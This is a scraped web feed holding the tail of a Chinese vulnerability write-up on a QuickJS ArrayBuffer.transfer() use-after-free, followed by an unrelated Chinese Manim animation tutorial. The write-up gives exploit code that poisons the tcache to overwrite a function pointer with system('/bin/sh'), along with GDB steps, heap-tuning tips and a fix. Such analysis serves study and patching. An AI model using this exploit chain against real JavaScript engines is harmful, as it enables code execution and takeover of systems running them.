<span class="hljs-keyword">const</span> ta3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab3);
<span class="hljs-keyword">const</span> ab4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab4);
<span class="hljs-keyword">let</span> ab3_f = ab3.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta3_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab3_f);
<span class="hljs-keyword">let</span> ab4_f = ab4.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta4_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab4_f);
ab3_f = <span class="hljs-literal">null</span>;
ta3_f = <span class="hljs-literal">null</span>;
ab4_f = <span class="hljs-literal">null</span>;
ta4_f = <span class="hljs-literal">null</span>;
ta4[<span class="hljs-number">0</span>] = map_addr ^ (heap_xor + <span class="hljs-number">0x00n</span>);
<span class="hljs-keyword">const</span> ab5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab5);
<span class="hljs-keyword">let</span> tmp = ab2.<span class="hljs-property">resizable</span>;
<span class="hljs-keyword">const</span> ab6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab6);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ta6.<span class="hljs-property">length</span>; i++) {
  ta6[i] = <span class="hljs-number">1n</span>;
}
ta6[<span class="hljs-number">0</span>] = heap_base + <span class="hljs-number">0x19c0n</span>;
ta6[<span class="hljs-number">1</span>] = <span class="hljs-number">0x51n</span>;
ta6[<span class="hljs-number">2</span>] = <span class="hljs-number">0xc010000000002n</span>;
ta6[<span class="hljs-number">3</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">4</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">6</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">7</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">8</span>] = heap_base + <span class="hljs-number">0x3178n</span>;
ta6[<span class="hljs-number">9</span>] = system;
ta6[<span class="hljs-number">11</span>] = <span class="hljs-number">0x68732f6e69622fn</span>;
<span class="hljs-keyword">let</span> num = <span class="hljs-built_in">parseFloat</span>(<span class="hljs-number">5.20</span>);
</code></pre>
<h4 data-id="heading-28">Exploit执行流程图</h4>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">JavaScript层:</span>
parseFloat(1.1)
    ↓
<span class="hljs-section">QuickJS内部:</span>
查找js_parseFloat函数指针
    ↓
从map_addr + 0x48位置加载函数指针
    ↓
⚠️ 我们已经覆盖为system()地址
    ↓
<span class="hljs-section">准备函数调用:</span>
RDI = 参数指针 (指向我们控制的内存)
    ↓
⚠️ RDI指向heap_base + 0x19c0 = <span class="hljs-string">"/bin/sh"</span>
    ↓
call [劫持的函数指针]
    ↓
<span class="hljs-section">实际执行:</span>
system(<span class="hljs-string">"/bin/sh"</span>)
    ↓
🎉 获得shell!
</code></pre>
<h4 data-id="heading-29">内存布局详解</h4>
<p>在利用链的最后阶段，目标地址<code>map_addr</code>的内存布局如下：</p>
<pre><code class="hljs language-ini" lang="ini">heap_base + 0x3120 (map_addr):
┌────────────────────┬─────────────────────────────────┐
│ Offset │ Value     │ Purpose                         │
├────────────────────┼─────────────────────────────────┤
│ +0x00  │ binsh_loc │ 指向"/bin/sh"字符串              │
│ +0x08  │ 0x51      │ Fake chunk size                 │
│ +0x10  │ flags     │ Object flags                    │
│ +0x18  │ list_ptr  │ Linked list pointer (稳定性)     │
│ +0x20  │ list_ptr  │ Linked list pointer             │
│ +0x28  │ padding   │                                 │
│ +0x30  │ list_ptr  │ Linked list pointer             │
│ +0x38  │ list_ptr  │ Linked list pointer             │
│ +0x40  │ list_ptr  │ Linked list pointer             │
│ +0x48  │ system()  │ ★ js_parseFloat函数指针 ★       │
│ +0x50  │ padding   │                                 │
│ +0x58  │ "/bin/sh" │ ★ 命令字符串 ★                  │
│ +0x60  │ ...       │                                 │
└────────────────────┴─────────────────────────────────┘

调用parseFloat时的寄存器状态:
<span class="hljs-attr">RIP</span> = system()地址
<span class="hljs-attr">RDI</span> = heap_base + <span class="hljs-number">0</span>x19c0 (指向<span class="hljs-string">"/bin/sh"</span>)
<span class="hljs-attr">RSI</span> = ... (不重要)
<span class="hljs-attr">RDX</span> = ... (不重要)
</code></pre>
<h4 data-id="heading-30">调试技巧与常见问题</h4>
<p>在实际利用过程中，可能遇到以下问题：</p>
<h5 data-id="heading-31">问题1：堆布局不稳定</h5>
<p><strong>现象</strong>：有时候泄露的地址不正确，或者tcache投毒失败</p>
<p><strong>原因</strong>：QuickJS的内存分配行为受到很多因素影响：</p>
<ul>
<li>脚本中的变量数量</li>
<li>注释的长度</li>
<li>字符串字面量的数量</li>
</ul>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 调整这些参数来稳定堆布局</span>
<span class="hljs-keyword">const</span> tmp1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);  <span class="hljs-comment">// 可能需要调整大小</span>
<span class="hljs-keyword">const</span> tmp5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);

<span class="hljs-comment">// 添加更多临时对象</span>
<span class="hljs-keyword">const</span> stabilizer1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> stabilizer2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
</code></pre>
<h5 data-id="heading-32">问题2：偏移量不匹配</h5>
<p><strong>现象</strong>：计算出的libc_base或heap_base看起来不对</p>
<p><strong>原因</strong>：不同的libc版本和环境有不同的偏移</p>
<p><strong>解决方案</strong>：使用GDB确定正确的偏移</p>
<pre><code class="hljs language-bash" lang="bash">gdb ./bin/qjs
(gdb) b js_array_buffer_transfer
(gdb) run exploit.js
<span class="hljs-comment"># 在泄露后断点</span>
(gdb) vmmap
<span class="hljs-comment"># 找到libc和heap的真实地址</span>
(gdb) p/x leaked_value
(gdb) p/x libc_base
<span class="hljs-comment"># 计算差值得到正确偏移</span>
</code></pre>
<h5 data-id="heading-33">问题3：程序崩溃</h5>
<p><strong>现象</strong>：在写入payload后程序crash</p>
<p><strong>原因</strong>：破坏了关键的内存结构</p>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 在写入关键数据前，先用安全值初始化</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ta6.<span class="hljs-property">length</span>; i++) {
    ta6[i] = <span class="hljs-number">1n</span>;  <span class="hljs-comment">// 或者其他安全值</span>
}

<span class="hljs-comment">// 然后只覆盖必要的字段</span>
ta6[<span class="hljs-number">9</span>] = system;  <span class="hljs-comment">// 只改函数指针</span>
</code></pre>
<h3 data-id="heading-34">GDB调试实战</h3>
<h4 data-id="heading-35">设置断点</h4>
<pre><code class="hljs language-bash" lang="bash">gdb ./bin/qjs
(gdb) <span class="hljs-built_in">set</span> args exploit.js

<span class="hljs-comment"># 在关键函数下断点</span>
(gdb) b js_array_buffer_transfer
(gdb) b *0xa659b  <span class="hljs-comment"># detached标志设置处</span>
(gdb) b js_parseFloat
(gdb) b system

(gdb) run
</code></pre>
<h4 data-id="heading-36">检查ArrayBuffer状态</h4>
<pre><code class="hljs language-gdb" lang="gdb"># 在transfer()入口
(gdb) print *(JSArrayBuffer*)$r8
$1 = {
  byte_length = 256,
  max_byte_length = -1,
  detached = 0,        # 未detach
  shared = 0,
  data = 0x555556789000,
  array_list = {
    next = 0x55555678a000,
    prev = 0x55555678a000
  },
  opaque = 0x0,
  free_func = 0x555555567890 &lt;js_array_buffer_free&gt;
}

# 继续到detached设置后
(gdb) ni
...
(gdb) print *(JSArrayBuffer*)$r8
$2 = {
  byte_length = 0,     # ✅ 已清零
  detached = 1,        # ✅ 已标记
  data = 0x0,          # ✅ 已清空
  array_list = {       # ❌ 链表还在
    next = 0x55555678a000,
    prev = 0x55555678a000
  },
  ...
}
</code></pre>
<h4 data-id="heading-37">检查TypedArray状态</h4>
<pre><code class="hljs language-gdb" lang="gdb"># 找到array_list中的第一个TypedArray
(gdb) set $ta = (JSTypedArray*)($r8-&gt;array_list.next)
(gdb) print *$ta
$3 = {
  link = {next = ..., prev = ...},
  obj = 0x55555678b000,
  buffer = 0x55555678c000,
  offset = 0,
  length = 64          # ❌ 应该是0！
}

# 查看对应的JSObject
(gdb) print $ta-&gt;obj-&gt;u.typed_array
$4 = {
  length = 64,         # ❌ 应该是0！
  data = 0x555556789000  # ❌ 应该是NULL！
}

# 这就是UAF的证据！
</code></pre>
<h4 data-id="heading-38">验证Tcache投毒</h4>
<pre><code class="hljs language-gdb" lang="gdb"># 在投毒后
(gdb) x/4gx $heap_addr
0x555556789000: 0x0000555556789100  # next指针(XORed)
0x555556789008: 0x0000000000000000
0x555556789010: 0x0000000000000000
0x555556789018: 0x0000000000000000

# 检查投毒后的next
(gdb) print/x *(uint64_t*)$heap_addr
$5 = 0x3120 ^ 0x555556789  # 指向map_addr！
</code></pre>
<h4 data-id="heading-39">验证函数指针劫持</h4>
<pre><code class="hljs language-gdb" lang="gdb"># 检查map_addr内存
(gdb) x/20gx $map_addr
0x555556789120: 0x00005555567891c0  # binsh location
0x555556789128: 0x0000000000000051  # size
0x555556789130: 0x000c010000000002  # flags
...
0x555556789168: 0x00007ffff7e58750  # system() ← 劫持！
...
0x555556789178: 0x0068732f6e69622f  # "/bin/sh"

# 在parseFloat调用前
(gdb) b *js_parseFloat_caller
(gdb) c
(gdb) print/x $rip
(gdb) print/x $rdi
$6 = 0x5555567891c0  # 指向"/bin/sh" ✅

# 单步进入
(gdb) si
# 应该进入system而不是js_parseFloat！
</code></pre>
<h3 data-id="heading-40">漏洞修复</h3>
<h4 data-id="heading-41">正确的修复方案</h4>
<pre><code class="hljs language-c" lang="c">JSValue <span class="hljs-title function_">js_array_buffer_transfer</span><span class="hljs-params">(...)</span> {
    <span class="hljs-comment">// ... 前面代码不变 ...</span>
    
    <span class="hljs-keyword">if</span> (new_len) {
        <span class="hljs-comment">// ... 数据转移代码 ...</span>
        
DETACH_AND_RETURN:
        <span class="hljs-comment">// ✅ 方案1: 调用现有的正确实现</span>
        JS_DetachArrayBuffer(ctx, this_val);
        
        <span class="hljs-keyword">return</span> js_array_buffer_constructor3(...);
        
        <span class="hljs-comment">/* ✅ 方案2: 手动实现完整detach逻辑
        
        // 遍历所有TypedArray视图
        struct list_head *el, *el1;
        list_for_each_safe(el, el1, &amp;v13-&gt;array_list) {
            JSTypedArray *ta = list_entry(el, JSTypedArray, link);
            JSObject *view = ta-&gt;obj;
            
            // 更新每个视图的状态
            if (view-&gt;class_id != JS_CLASS_DATAVIEW) {
                view-&gt;u.typed_array.length = 0;
                view-&gt;u.typed_array.data = NULL;
            }
        }
        
        // 最后才标记buffer为detached
        v13-&gt;detached = 1;
        v13-&gt;data = 0;
        v13-&gt;byte_length = 0;
        
        return js_array_buffer_constructor3(...);
        */</span>
    }
    
    <span class="hljs-comment">// new_len == 0的情况已经正确处理了</span>
    <span class="hljs-keyword">else</span> {
        JS_DetachArrayBuffer(ctx, this_val);
        <span class="hljs-keyword">return</span> js_array_buffer_constructor3(...);
    }
}
</code></pre>
<h4 data-id="heading-42">修复效果验证</h4>
<p>修复后，运行PoC应该得到：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">[Phase <span class="hljs-number">4</span>] Testing UAF: Reading <span class="hljs-keyword">from</span> detached TypedArray...
  [*] Attempting <span class="hljs-keyword">to</span> read ta1[<span class="hljs-number">0</span>] (should fail but won<span class="hljs-comment">'t)...</span>

<span class="hljs-symbol">TypeError:</span> ArrayBuffer <span class="hljs-built_in">is</span> detached
    at &lt;anonymous&gt;:<span class="hljs-number">1</span>:<span class="hljs-number">18</span>

[✓] NO UAF DETECTED (Expected secure behavior)
</code></pre>
<h3 data-id="heading-43">总结</h3>
<h4 data-id="heading-44">漏洞本质</h4>
<p>这个漏洞的核心是<strong>状态同步不完整</strong>：</p>
<ol>
<li>ArrayBuffer对象被正确标记为detached</li>
<li>但TypedArray视图的状态没有同步更新</li>
<li>导致TypedArray持有指向已释放内存的悬空指针</li>
<li>形成典型的Use-After-Free漏洞</li>
</ol>
<h4 data-id="heading-45">利用链回顾</h4>
<p>完整的利用链包括：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-attr">[1]</span> UAF触发
    ↓ (transfer()不更新TypedArray)
<span class="hljs-selector-attr">[2]</span> Unsorted bin泄露libc
    ↓ (大块释放进unsorted bin保留fd/bk指针)
<span class="hljs-selector-attr">[3]</span> Tcache泄露heap
    ↓ (SAFE_LINKING XOR可逆)
<span class="hljs-selector-attr">[4]</span> Tcache投毒
    ↓ (UAF写next指针)
<span class="hljs-selector-attr">[5]</span> 任意地址分配
    ↓ (tcache返回我们控制的地址)
<span class="hljs-selector-attr">[6]</span> 任意写入
    ↓ (覆写函数指针)
<span class="hljs-selector-attr">[7]</span> RIP劫持
    ↓ (parseFloat() → <span class="hljs-built_in">system</span>())
<span class="hljs-selector-attr">[8]</span> Getshell!
</code></pre>
<h4 data-id="heading-46">关键技术点</h4>
<ol>
<li><strong>UAF成因分析</strong>：对比正确实现（resize/detach）理解问题根源</li>
<li><strong>SAFE_LINKING绕过</strong>：理解glibc 2.32+的指针保护机制</li>
<li><strong>Tcache投毒</strong>：经典堆利用技术的应用</li>
<li><strong>函数指针劫持</strong>：选择合适的目标和触发方式</li>
<li><strong>参数控制</strong>：利用调用约定控制RDI指向"/bin/sh"</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让你的动画“活”过来：Manim 节奏控制指南 (Rate Functions)]]></title>    <link>https://juejin.cn/post/7575313772988186665</link>    <guid>https://juejin.cn/post/7575313772988186665</guid>    <pubDate>2025-11-23T06:27:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575313772988186665" data-draft-id="7575442779038548010" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让你的动画“活”过来：Manim 节奏控制指南 (Rate Functions)"/> <meta itemprop="keywords" content="Python,动效,后端"/> <meta itemprop="datePublished" content="2025-11-23T06:27:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让你的动画“活”过来：Manim 节奏控制指南 (Rate Functions)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T06:27:44.000Z" title="Sun Nov 23 2025 06:27:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你在制作Manim动画时，是否遇到过这样的困境？</p>
<p>“代码写得天衣无缝，运行流畅，出来的动画却总觉得哪里不对劲？”</p>
<p>虽然物体确实从 A 移动到了 B，但看起来就像是老旧的工业机器人在干活——僵硬、死板，甚至有点无聊。</p>
<p>其实，你的动画离 <strong>“丝滑”</strong> 和 <strong>“专业”</strong>，往往只差这一个参数的距离：<code>rate_func</code> <strong>(速率函数)</strong>。</p>
<p>今天，我们就来聊聊 Manim 中这个不起眼但至关重要的参数，看看如何通过控制 <strong>“时间的流速”</strong>，让你的数学动画不仅能动，而且动得有节奏、有灵魂。</p>
<h2 data-id="heading-0">1. 什么是 Rate Function？（给时间的进度条）</h2>
<p>在 <code>Manim</code> 中，当你写下 <code>.animate.shift(RIGHT)</code> 时，默认发生了什么？</p>
<p>如果你觉得动画只是简单的“在 <code>Run Time</code> 时间内移动距离 <code>RIGHT</code>”，那只对了一半。<code>Rate Function</code> 本质上是<strong>动画完成度与时间的关系</strong>。</p>
<p>想象一下你在看视频时的进度条：</p>
<ul>
<li><strong>输入 (</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span><strong>)</strong>：当前时间过去了多少（从 0 到 1，代表 0% 到 100% 的时间）。</li>
<li><strong>输出 (</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span></span><strong>)</strong>：动画实际上完成了多少（从 0 到 1，代表 0% 到 100% 的进度）。</li>
</ul>
<p><strong>默认的魔法</strong>：<code>Smooth</code></p>
<p>Manim 的默认 <code>rate_func</code> 是 <code>smooth</code>。
这符合物理世界的惯性定律：<strong>起步时慢（加速），中间快，快结束时慢（减速）</strong>。</p>
<p>这就是为什么默认的动画看起来比较自然。</p>
<p>如果我们把它换成 <code>linear</code>（线性），物体就会瞬间以最大速度启动，最后瞬间急停，看起来就会很像 <strong>“PPT 动画”</strong>。</p>
<h2 data-id="heading-1">2. 常用函数图鉴：选对“调味料”</h2>
<p><code>Manim</code>内置了一大堆写好的函数，位于 <code>manim.utils.rate_functions</code>。</p>
<p>我们可以把它们看作是给动画调味的香料。</p>
<p>为了方便演示，我们假设我们要移动一个小球。</p>
<h3 data-id="heading-2">2.1. 基础三剑客</h3>
<ul>
<li><code>linear</code> <strong>(匀速)</strong>
<ul>
<li><strong>效果</strong>：机械感强，速度恒定。</li>
<li><strong>适用场景</strong>：旋转的齿轮、循环滚动的背景、匀速扫描的雷达。</li>
</ul>
</li>
<li><code>smooth</code> <strong>(默认)</strong>
<ul>
<li><strong>效果</strong>：两头慢，中间快。</li>
<li><strong>适用场景</strong>：绝大多数物体的移动、缩放。</li>
</ul>
</li>
<li><code>rush_into</code> / <code>rush_from</code>
<ul>
<li><strong>效果</strong>：
<ul>
<li><code>rush_into</code>: 越走越快，最后“砰”地撞线（只有加速）。</li>
<li><code>rush_from</code>: 一开始很快，慢慢停下来（只有减速）。</li>
</ul>
</li>
<li><strong>适用场景</strong>：连续动作的衔接。比如小球飞入画面停下（<code>rush_from</code>），或者发射出去（<code>rush_into</code>）。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">2.2. 动感特效组</h3>
<ul>
<li><code>there_and_back</code> <strong>(往返)</strong>
<ul>
<li><strong>效果</strong>：走到终点，又原路返回起点。</li>
<li><strong>适用场景</strong>：强调某个东西。比如把公式放大一下再缩回去，告诉观众“看这里！”。</li>
</ul>
</li>
<li><code>wiggle</code> <strong>(摆动)</strong>
<ul>
<li><strong>效果</strong>：像果冻一样左右晃动一下。</li>
<li><strong>适用场景</strong>：表示“错误”、“拒绝”或者引起注意。</li>
</ul>
</li>
<li><code>running_start</code> <strong>(助跑)</strong>
<ul>
<li><strong>效果</strong>：先向后退一点点，然后猛地向前冲。</li>
<li><strong>适用场景</strong>：想要表现物体很有力量感，或者像卡通片里的冲刺效果。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">2.3. 物理模拟组</h3>
<ul>
<li><code>ease_out_bounce</code><strong>(落地反弹)</strong>
<ul>
<li><strong>效果</strong>：像篮球落地一样，到底部后弹跳几次再停下。</li>
<li><strong>适用场景</strong>：文字掉落、物体自由落体。</li>
</ul>
</li>
</ul>
